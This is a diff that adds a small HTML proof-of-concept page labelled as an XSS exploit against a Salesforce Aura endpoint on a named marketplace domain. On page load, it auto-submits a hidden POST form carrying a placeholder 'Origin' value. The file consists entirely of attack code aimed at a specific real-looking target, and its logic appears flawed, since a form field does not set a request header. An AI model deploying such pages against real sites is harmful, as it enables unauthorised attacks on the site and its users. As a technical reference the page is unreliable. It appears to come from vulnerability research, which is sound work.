@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS PoC - https://marketplace.tw.coupangcorp.com/tw/s/sfsites/aura?r=&amp;ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=</title>
+</head>
+<body>
+  <form id="pocForm" action="https://marketplace.tw.coupangcorp.com/tw/s/sfsites/aura" method="POST">
+    <input type="hidden" name="Origin" value="https://xssboss.invalid" />
+  </form>
+  <script>
+    document.getElementById('pocForm').submit();
+  </script>
+</body>
+</html>
